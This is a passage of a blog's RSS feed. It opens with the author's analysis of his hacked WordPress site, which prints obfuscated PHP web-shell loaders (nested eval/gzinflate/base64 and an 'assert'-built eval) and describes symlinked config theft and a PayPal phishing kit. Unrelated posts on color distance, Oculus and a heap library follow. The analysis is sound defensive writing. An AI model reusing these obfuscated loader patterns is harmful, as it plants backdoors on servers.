&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='bash'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;eval&lt;/span&gt;(gzinflate(base64_decode(&lt;span class=&quot;hljs-string&quot;&gt;'FZzHbuvKtkU/554...L63//+8++///73/wE='&lt;/span&gt;)));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;seventh…&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='bash'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;echo&lt;/span&gt;(gzinflate(base64_decode(&lt;span class=&quot;hljs-string&quot;&gt;'FZ3HbuRKEkU/Z94...4nCAI0SDH/+ffff//7fw=='&lt;/span&gt;)));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Actually, it goes on &lt;strong&gt;40 more times&lt;/strong&gt;, like a demented matroyshka doll. It’s not UTF-8 encoded, so I had to guess a handful of encodings before discovering that it was what Sublime Text calls “Cyrillic (Windows 1251)”. It’s 1500 lines, so I’ve posted it in a &lt;a href=&quot;https://gist.github.com/antimatter15/f40a4615c68eea373ad4&quot;&gt;Gist&lt;/a&gt; rather than sticking it inline here. &lt;/p&gt;
&lt;p&gt;I skimmed through the code and it seemed relatively safe— or at least it didn’t seem to plant any rootkits or start any persistent processes. So I ran it and got a screenshot. It seems to call itself “C99madShell v. 3.0 BLOG edition.php”&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;WebShell&quot;  src=&quot;/articles/2014/Getting%20Hacked/webshell.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The other distinct file, &lt;code&gt;xstyles.php&lt;/code&gt; seems to be a little more unique. &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='tex'&gt;&lt;/span&gt;&amp;lt;?php 

&lt;span class=&quot;hljs-formula&quot;&gt;$n = 'ss';
$&lt;/span&gt;r =&quot;rt&quot;;
&lt;span class=&quot;hljs-formula&quot;&gt;$a = &quot;a&quot;;
$&lt;/span&gt;y='e';
&lt;span class=&quot;hljs-formula&quot;&gt;$q = $&lt;/span&gt;a.&lt;span class=&quot;hljs-formula&quot;&gt;$n.$&lt;/span&gt;y.&lt;span class=&quot;hljs-formula&quot;&gt;$r;

$&lt;/span&gt;v = '5b17fxo30zD8d/Ip5C3tQoMx4CRXYgx...8B';

@&lt;span class=&quot;hljs-formula&quot;&gt;$q(&quot;e&quot;.&quot;va&quot;.&quot;l('&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;76&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;6c&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;28&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;67&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;7a&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;69&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;6e&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;66&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;6c&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;74&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;28&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;61&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;73&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;36&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;34&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;5f&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;63&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;6f&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;64&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;65&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;28&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;24&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;76&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;29&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;29&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;29&lt;span class=&quot;hljs-command&quot;&gt;\x&lt;/span&gt;3b');&quot;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So what does it do? Well, the first part basically just assembles &lt;code&gt;q&lt;/code&gt; with the value “assert”. &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='cs'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;hljs-params&quot;&gt;( mixed $assertion [, &lt;span class=&quot;hljs-keyword&quot;&gt;string&lt;/span&gt; $description ] )&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When PHP’s built-in assert function is passed a string &lt;code&gt;$assertion&lt;/code&gt;, it evaluates that string. It’s less known than &lt;code&gt;eval&lt;/code&gt; so this is plausibly useful for evading firewalls of a certain sort. So what it finally translates to is:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='bash'&gt;&lt;/span&gt;assert(&lt;span class=&quot;hljs-string&quot;&gt;&quot;eval('eval(gzinflate(base64_decode(&lt;span class=&quot;hljs-variable&quot;&gt;$v&lt;/span&gt;)));');&quot;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The decoded file starts out like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='handlebars'&gt;&lt;/span&gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;hljs-variable&quot;&gt;$auth_pass&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;&quot;cef26cef9c9fdbdb49363368c8921635&quot;&lt;/span&gt;;
&lt;span class=&quot;hljs-variable&quot;&gt;$color&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;&quot;#df5&quot;&lt;/span&gt;;
&lt;span class=&quot;hljs-variable&quot;&gt;$default_action&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;'FilesMan'&lt;/span&gt;;
&lt;span class=&quot;hljs-variable&quot;&gt;$default_use_ajax&lt;/span&gt; = &lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;;
&lt;span class=&quot;hljs-variable&quot;&gt;$default_charset&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;'Windows-1251'&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I searched around for the password, but nobody’s yet been able to find a matching plaintext. However, along the way I found out about &lt;a href=&quot;http://ddecode.com/phpdecoder/&quot;&gt;PHPDecoder&lt;/a&gt; which would have saved quite a bit of time an hour ago.&lt;/p&gt;
&lt;p&gt;This one is also 1500 lines, so I’ve posted it in another &lt;a href=&quot;https://gist.github.com/antimatter15/a2375e36f0f04dc6b3fb&quot;&gt;Gist&lt;/a&gt;. This one looks aesthetically a bit nicer— if it’s not too weird to complement the tools of the people who hacked your website. &lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;WebShell&quot;  src=&quot;/articles/2014/Getting%20Hacked/xstyles.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;There’s one (hah, pun not intended) folder entitled &lt;code&gt;1/&lt;/code&gt; which is particularly interesting. It has three subdirectories: &lt;code&gt;configweb&lt;/code&gt;, &lt;code&gt;sym&lt;/code&gt;, and &lt;code&gt;tumdizin&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Configweb seems to be a directory filled with symlinks to 9414 distinct configuration files, each of them residing on someone else’s home directory. It encompasses lots of different software packages including Joomla, Wordpress, Zencart, SMF, WHM, OSCommerce, VBulletin and ore. &lt;/p&gt;
&lt;p&gt;The directory &lt;code&gt;sym&lt;/code&gt; seems to just contain a symlink entitled &lt;code&gt;root&lt;/code&gt; to— you guessed it— &lt;code&gt;/&lt;/code&gt;. &lt;/p&gt;
&lt;p&gt;And finally &lt;code&gt;tumdizin&lt;/code&gt; seems to link to the web roots of 116 distinct shared hosting accounts which happen to reside on the same server.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;There’s also that folders which blow up in the tree &lt;code&gt;x4MslaR1CW&lt;/code&gt;, and &lt;code&gt;ptRiJiayze&lt;/code&gt;. You can probably guess by files like &lt;code&gt;logo_paypal_106x29.png&lt;/code&gt; that this site got turned essentially into a phishing website for Paypal. I’m actually rather amazed that the result looks so plausible. &lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2014/Getting%20Hacked/paypal.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;However, it seems that there was some weird activity going on starting a few days before the massive traffic. There’s an &lt;code&gt;error_log&lt;/code&gt; file which seems to grow pretty slowly in general. There was a fairly large stretch from January to June with no errors— and then it seemed to constantly encounter these errors leading up to the traffic spike. &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='groovy'&gt;&lt;/span&gt;[&lt;span class=&quot;hljs-number&quot;&gt;03&lt;/span&gt;-Jun-&lt;span class=&quot;hljs-number&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;17&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;06&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;05&lt;/span&gt; UTC] PHP &lt;span class=&quot;hljs-string&quot;&gt;Warning:&lt;/span&gt;  Cannot modify header information - headers already sent by (output started at &lt;span class=&quot;hljs-regexp&quot;&gt;/home/&lt;/span&gt;antimatt&lt;span class=&quot;hljs-regexp&quot;&gt;/public_html/&lt;/span&gt;wp&lt;span class=&quot;hljs-regexp&quot;&gt;/wp-rss.php(1) : eval()'d code:1) in /&lt;/span&gt;home&lt;span class=&quot;hljs-regexp&quot;&gt;/antimatt/&lt;/span&gt;public_html&lt;span class=&quot;hljs-regexp&quot;&gt;/wp/&lt;/span&gt;wp-includes/pluggable.php on line &lt;span class=&quot;hljs-number&quot;&gt;1121&lt;/span&gt;
[&lt;span class=&quot;hljs-number&quot;&gt;04&lt;/span&gt;-Jun-&lt;span class=&quot;hljs-number&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;19&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;31&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt; UTC] PHP &lt;span class=&quot;hljs-string&quot;&gt;Warning:&lt;/span&gt;  include(images&lt;span class=&quot;hljs-regexp&quot;&gt;/settings.php): failed to open stream: No such file or directory in /&lt;/span&gt;home&lt;span class=&quot;hljs-regexp&quot;&gt;/antimatt/&lt;/span&gt;public_html&lt;span class=&quot;hljs-regexp&quot;&gt;/wp/&lt;/span&gt;wp-content&lt;span class=&quot;hljs-regexp&quot;&gt;/themes/&lt;/span&gt;carrington-woot/footer.php on line &lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;
[&lt;span class=&quot;hljs-number&quot;&gt;04&lt;/span&gt;-Jun-&lt;span class=&quot;hljs-number&quot;&gt;2014&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;19&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;31&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt; UTC] PHP &lt;span class=&quot;hljs-string&quot;&gt;Warning:&lt;/span&gt;  include(images&lt;span class=&quot;hljs-regexp&quot;&gt;/settings.php): failed to open stream: No such file or directory in /&lt;/span&gt;home&lt;span class=&quot;hljs-regexp&quot;&gt;/antimatt/&lt;/span&gt;public_html&lt;span class=&quot;hljs-regexp&quot;&gt;/wp/&lt;/span&gt;wp-content&lt;span class=&quot;hljs-regexp&quot;&gt;/themes/&lt;/span&gt;carrington-woot/footer.php on line &lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;p&gt;I ended up downloading a daily backup of the server which was taken before it was hacked (June 1, 2014) and installing it onto a small virtual machine. I downloaded a Wordpress plugin for exporting the entire website as static HTML pages and uploaded it to Github pages. This served as a stop-gap measure for almost an entire year while I was getting the new site to work.&lt;/p&gt;
&lt;p&gt;This experience is largely why I decided that this new incarnation would be a static site— essentially free from the perils that come with a dynamic website. It’s not like the old version used dynamic content to much advantage anyway, it was cached enough that it was practically static anyway. &lt;/p&gt;
</description>
    </item>
    <item>
      <title>Perceptual color distance and RGB and L*a*b</title>
      <link>http://antimatter15.com/2014/05/perceptual-color-distance-and-rgb-and-l-a-b/</link>
      <pubDate>Fri, 30 May 2014 23:35:01 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2014/05/perceptual-color-distance-and-rgb-and-l-a-b/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2014/CIEsmic%20Inflation/CIEsmic-Inflation1.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;CIEsmic-Inflation&quot;  src=&quot;/articles/2014/CIEsmic%20Inflation/CIEsmic-Inflation1-1024x748.jpg&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I was doing some experiments with clustering colors, and it turns out that RGB euclidean distance is woefully inadequate, so here’s a neat little visualization of the colors in an certain image (an obligatory cat) in L&lt;em&gt;a&lt;/em&gt;b space (specifically the axes represent L&lt;em&gt; and a&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;So it turns out that comparing the difference between RGB colors is actually a really shitty way to determine color distance. There are colors which have similar RGB representations while being perceptually distant, and perceptually similar colors with vastly different representations.&lt;/p&gt;
&lt;p&gt;So I decided to run a series of large scale double-blind (heh) experiments on human perception, analyzing the output with a dizzying array of statistical techniques and— oh wait, no I didn’t, because scientists have gotten that all figured out since the late ‘70s.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2014/CIEsmic%20Inflation/Screenshot-2014-03-23-00.03.39.png&quot;&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 200px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2014/CIEsmic%20Inflation/Screenshot-2014-03-23-00.03.39-300x297-medium.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;I was doing some experiments with clustering colors, and it turns out that RGB euclidean distance is woefully inadequate, so here&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;That group of color scientists, the International Commission on Illumination (CIE, acronyms are a bit weird when &lt;a href=&quot;https://en.wikipedia.org/wiki/Coordinated_Universal_Time&quot;&gt;they’re international&lt;/a&gt;, and by international, I mean &lt;a href=&quot;https://en.wikipedia.org/wiki/International_System_of_Units&quot;&gt;French&lt;/a&gt;), have been working tirelessly since the early 20th century to create increasingly nuanced mathematical models of color perception.&lt;/p&gt;
&lt;p&gt;Rather than&lt;a href=&quot;http://ajaxian.com/archives/css-and-tables-the-war-continues/giveupandusetables&quot;&gt; give up and use tables&lt;/a&gt; (of a slightly different sort), they’ve elected to add increasingly nuanced corrections to the originally elegant euclidean distance metric. Somewhere on that trek, they’ve actually abandoned the notion of actually being a metric- the DeltaE function, which defines how to calculate the perceptual distance between any two colors, is actually only a quasimetric— that is, it isn’t guaranteed that the distance from a point A to a point B is the same as the distance from point B to point A.&lt;/p&gt;
&lt;p&gt;I originally wrote this blog post to be parody of all the buzz over the discover of evidence for Alan Guth’s cosmic inflationary theory (hence the diagram), but I kind of waited a while for the content to ferment (albeit not the decades requisite to be worthy of a Nobel).&lt;/p&gt;
&lt;p&gt;So here’s a&lt;a href=&quot;https://github.com/antimatter15/rgb-lab&quot;&gt; little library &lt;/a&gt;for converting between L*a*b* and sRGB, as well as computing DeltaE. There’s probably stuff like configuring the white point that I haven’t adequately considered, but this was good enough for my purposes of filtering colors for Project Naptha.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Project Naptha</title>
      <link>http://antimatter15.com/2014/04/project-naptha/</link>
      <pubDate>Wed, 23 Apr 2014 22:58:34 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2014/04/project-naptha/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://projectnaptha.com&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Screenshot 2014-04-24 02.56.29&quot;  src=&quot;/articles/2014/Project%20Naptha/Screenshot-2014-04-24-02.56.29-1024x531.png&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So, well, &lt;a href=&quot;http://projectnaptha.com&quot;&gt;this kinda finally launched&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Unwarranted Speculation On Oculus VR</title>
      <link>http://antimatter15.com/2014/03/unwarranted-speculation-on-oculus-vr/</link>
      <pubDate>Sat, 29 Mar 2014 23:25:05 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2014/03/unwarranted-speculation-on-oculus-vr/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2014/Unwarranted%20Speculation%20On%20Oculus%20VR/oculus-rift-crystal-cove-100245805-orig_clipped_rev_2.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;oculus-rift-crystal-cove-100245805-orig_clipped_rev_2&quot;  src=&quot;/articles/2014/Unwarranted%20Speculation%20On%20Oculus%20VR/oculus-rift-crystal-cove-100245805-orig_clipped_rev_2-300x237.png&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I’m almost certainly an outsider, so I can’t speak for the gaming or VR communities, but to me the Facebook acquisition (and the &lt;a href=&quot;http://antimatter15.com/2014/03/unwarranted-speculation-on-oculus-vr/www.oculusvr.com/blog/introducing-michael-abrash-oculus-chief-scientist/&quot;&gt;Abrash onboarding announcement&lt;/a&gt;) signals that the new Oculus is more interested in bringing to fruition the Metaverse from &lt;a href=&quot;https://en.wikipedia.org/wiki/Snow_Crash&quot;&gt;Snow Crash&lt;/a&gt;, and that the hardware (Rift DK1, Crystal Cove, DK2, etc.) has been reduced to a mere means to attaining that end.&lt;/p&gt;
&lt;p&gt;I think the “original” product was always contextualized as a gaming accessory, as the vested (financial, by virtue of &lt;a href=&quot;https://www.kickstarter.com/projects/1523379957/oculus-rift-step-into-the-game&quot;&gt;Kickstarter&lt;/a&gt;) interest was held by gamers hoping to utilize this new form factor and experience.&lt;/p&gt;
&lt;p&gt;I guess the question is what exactly is Oculus? In the beginning, I’d venture that the answer was simple. They were building a head mounted display which would be affordable, leveraging the technological improvements of the past decade (cheap high quality displays meant for phones and tablets, faster graphics cards). The hardware was their concern, and the software, the games and experiences, everyone else’s.&lt;/p&gt;
&lt;p&gt;From the &lt;a href=&quot;https://www.youtube.com/watch?v=8gaqQdyfAz8&quot;&gt;QuakeCon Abrash-Carmack-Luckey&lt;/a&gt; panel (which may be a bit dated), Carmack admits that he isn’t really interested in developing the hardware, as opposed to Luckey whose passion really lies in developing that hardware. Carmack, Abrash, and ultimately Facebook are alike in that they are &lt;em&gt;software&lt;/em&gt; titans, which I think really shifts the balance in terms of the intentions for Oculus.&lt;/p&gt;
&lt;p&gt;Sure there’s the hardware aspect, which is far from a solved problem. But given the palpable progress of Crystal Cove and the famed Valve prototypes, the end is nigh (to be less melodramatic, the consumer edition is on the brink of happening). But if you look at the teardowns, it’s a tablet screen, LEEP optics, an inertial measurement unit, and infrared tracker. The underlying display technology isn’t going to get better, because it’s already piggybacking off a much larger market where even Facebook’s considerable budget is a drop in the bucket.&lt;/p&gt;
&lt;p&gt;I think since Carmack joined Luckey’s shop, the destiny of Oculus has shifted from producers of a mere display commodity to a more vertically integrated entity which develops both the hardware and the software which drives its progress and adoption (a la Apple).&lt;/p&gt;
&lt;p&gt;And that accumulation of software talent is, I think, itself, a credible threat to the game developers hoping to build games for the Rift- because it establishes a first party, and that has the risk of pushing third party developers into the realm of the second class citizen.&lt;/p&gt;
&lt;p&gt;But this dynamic of conflicted interest has played out several times before, and it is not usually an &lt;em&gt;existential&lt;/em&gt; risk to the third parties. With transitions flipped, Microsoft had to deal with the risk of alienating OEMs when it started developing its own hardware- the Surface tablet. Likewise, Google’s decision to develop Nexus tablets and phones (and the acquisition of Motorola Mobility) was criticized because it would inevitably result in favoritism for its own devices, weakening relationships between LG, HTC, Samsung and the ilk.&lt;/p&gt;
&lt;p&gt;The risk in stifling competition is inherent in any kind of move involving integration (horizontal, vertical, or 37 degrees counterclockwise), but on the other hand, this dissolution of the separation of interests enables the unimpeded progress toward a coherent vision.&lt;/p&gt;
&lt;p&gt;And I think that coherent vision is to construct Virtual Reality that is truly grand, world-encompassing and liable to all the philosophical depth missing from prior incarnations outside of science fiction. Not the kind of gimmicky interactions retrofitted into first person shooters, jumping onto the bandwagon represented by that euphemistic initialism “VR”.&lt;/p&gt;
&lt;p&gt;I don’t think post-acquisition institutional independence or agency ultimately matter, because the seeds for something larger has already been sown.&lt;/p&gt;
&lt;p&gt;Is this new Oculus a threat to existing companies and their efforts to build VR games? Perhaps, this has to be true on some level, the more interesting question, I think, is whether or not this cost will be offset (and then some) by those inspired by Oculus’s vision and audacity and that which can be built on this new and boundless meta-platform.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;small&gt;
..so I just finished writing all of this. I originally meant it as a Hacker News comment, and then halfway through I decided not to ultimately submit it, because if you really think about it, this is all kind of silly. I feel like one of those poor conspiracy theorists connecting dots where the lines may not exist. I’m sure there are nontrivial technical challenges that still need to be vanquished, but as an outside observer, I’d claim that Dunning-Kruger permeates my perception, and I can’t possibly gauge the extent of problems that remain (the less you know, the simpler it all seems). And I have a habit of conflating long term with short term (when I was 12, I vowed not to learn to drive, because surely, aeons from then, when I turned 16, the cars would no doubt drive themselves). &lt;/small&gt;&lt;small&gt;I mean, I wrote all of this like five minutes ago, it can’t be _that _wrong already, right?&lt;/small&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>February Progress Report</title>
      <link>http://antimatter15.com/2014/02/february-progress-report/</link>
      <pubDate>Thu, 27 Feb 2014 22:10:20 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2014/02/february-progress-report/</guid>
      <author></author>
      <description>&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Work expands so as to fill the time available for its completion.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;— Parkinson’s Law&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For the past four or so months, I’ve been working on just one major project. It’s rather depressing to think that I built a reasonably impressive initial prototype over the course of about a dozen sleep-deprived hours, and that all I’ve accomplished since then is minor polish. Technically, there have been at least two rewrites, completely new capabilities and substantially improved technology, but none of that really matters when it comes to describing the project. A project is what it is, at 80% completion, at 95% and 99%.&lt;/p&gt;
&lt;p&gt;Second semester at school has started, and that means that Pass/No Record isn’t a thing anymore, and everyone else is adjusting their behavior appropriately. Problem is, &lt;em&gt;I&lt;/em&gt; haven’t changed. It turns out that an entire semester of racing toward the bottom is unsustainable when suddenly the floor has been adjusted to above your current position. But the more important point is that it’s leaving less time, and in particular, less contiguous time to work on anything.&lt;/p&gt;
&lt;p&gt;Last month, I was working on a port of the Telea inpainting algorithm. Inpainting refers to any kind of image processing operation which attempts to intelligently fill in certain regions of an image with other content. Perhaps the most famous implementation of this is Photoshop’s Content Aware Fill feature, which uses a texture-synthesis and patch-based system, which enables them to copy over things like patterns, and textures, filling in vast contiguous regions of missing content. The problem is patch-based inpainting is almost always quite slow, in spite of its high quality results. There are simpler algorithms based on the Fast Marching Method like Telea or Navier-Stokes which use diffusion models and the ilk in order to propagate the solid colors of the bordering region of some inpainting mask inwards. I’ll write an actual blog post about this once I package it up and build a nifty demo for it.&lt;/p&gt;
&lt;p&gt;Last year, Ben Kamens of Khan Academy posted about reverse engineering the flyout menu in Amazon, which suffered from the rather odd behavior of &lt;em&gt;acting exactly how it should&lt;/em&gt;. You totally should be able to navigate to a submenu without worrying about accidentally mousing over something else. I looked around for a context menu library which could actually do this, but for some reason I couldn’t find one, so I decided to make my own.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>HeapQueue.JS</title>
      <link>http://antimatter15.com/2014/01/heapqueue-js/</link>
      <pubDate>Tue, 28 Jan 2014 07:51:32 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2014/01/heapqueue-js/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2014/HeapQueue.JS/heap.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;heap&quot;  src=&quot;/articles/2014/HeapQueue.JS/heap-300x222.png&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I have a &lt;a href=&quot;https://github.com/antimatter15/ocrad.js&quot;&gt;habit&lt;/a&gt; of writing blog posts in &lt;a href=&quot;http://www.sublimetext.com/3&quot;&gt;Sublime Text&lt;/a&gt; in lieu of legitimate READMEs. This &lt;a href=&quot;https://github.com/antimatter15/heapqueue.js&quot;&gt;project&lt;/a&gt; was simple and short enough that I think I did manage to write something with a passable semblance to a&lt;a href=&quot;https://github.com/antimatter15/heapqueue.js/blob/master/README.md&quot;&gt; functional README&lt;/a&gt; before initiating this quest to craft a blog post.&lt;/p&gt;
&lt;p&gt;This is hardly a project that I’d expect to go down in the annals of my blog as particularly interesting or notable. Instead, it’s a rather boring low-level &lt;a href=&quot;http://en.wikipedia.org/wiki/Heap_data_structure&quot;&gt;computer sciencey thingy&lt;/a&gt; who would feel perfectly comfortable amidst homework assignments.&lt;/p&gt;
&lt;p&gt;In fact, it’s virtually assured that documenting this endeavor– the combination of writing the words which comprise this post and the documentation already written on how to use this rather simple library– will inevitably consume more of my time than actual coding (people who are more familiar with highly intricate professional software tapestries may claim that such is merely the ideal and typical experience of a programmer).&lt;/p&gt;
&lt;p&gt;Notice that I’ve managed to spend three paragraphs (well, my paragraphs are on the order of two sentences, so it doesn’t even qualify for the fourth-grade definition for what a paragraph is) talking about the uninteresting character of the project, its relative diminutive size, and the process of writing about the subject, without actually describing what exactly the project is. This, more than perhaps any other project of mine deserves such a diversion, for it is unlikely to yield&lt;a href=&quot;/articles/2014/HeapQueue.JS/vQvAaGW.jpg&quot;&gt; “much amaze”&lt;/a&gt; or even a modest &lt;a href=&quot;/articles/2014/HeapQueue.JS/tumblr_mtsg23ehsy1sjf3who1_500.jpg&quot;&gt;“such wow”&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;It is a binary heap priority queue, a teensy bit shy of 50 lines, a mere kilobyte minified. It’s very loosely based off of Adam Hooper’s &lt;a href=&quot;https://github.com/adamhooper/js-priority-queue&quot;&gt;js-priority-queue&lt;/a&gt; but considerably smaller.&lt;/p&gt;
&lt;p&gt;Now that I’ve gotten the actual informative and useful part of the blog post off my shoulders, I can take you along for the unproductive plunge into the rather lame backstory for the project. I was working on a port of the &lt;a href=&quot;http://iwi.eldoc.ub.rug.nl/FILES/root/2004/JGraphToolsTelea/2004JGraphToolsTelea.pdf&quot;&gt;Telea&lt;/a&gt; &lt;a href=&quot;http://en.wikipedia.org/wiki/Inpainting&quot;&gt;inpainting&lt;/a&gt; algorithm and needed a &lt;a href=&quot;http://en.wikipedia.org/wiki/Priority_queue&quot;&gt;priority queue&lt;/a&gt;, because the little incremental&lt;a href=&quot;http://en.wikipedia.org/wiki/Insertion_sort&quot;&gt; insertion sort&lt;/a&gt; that I hacked together in two lines was taking a few orders of magnitude longer than was acceptable.&lt;/p&gt;
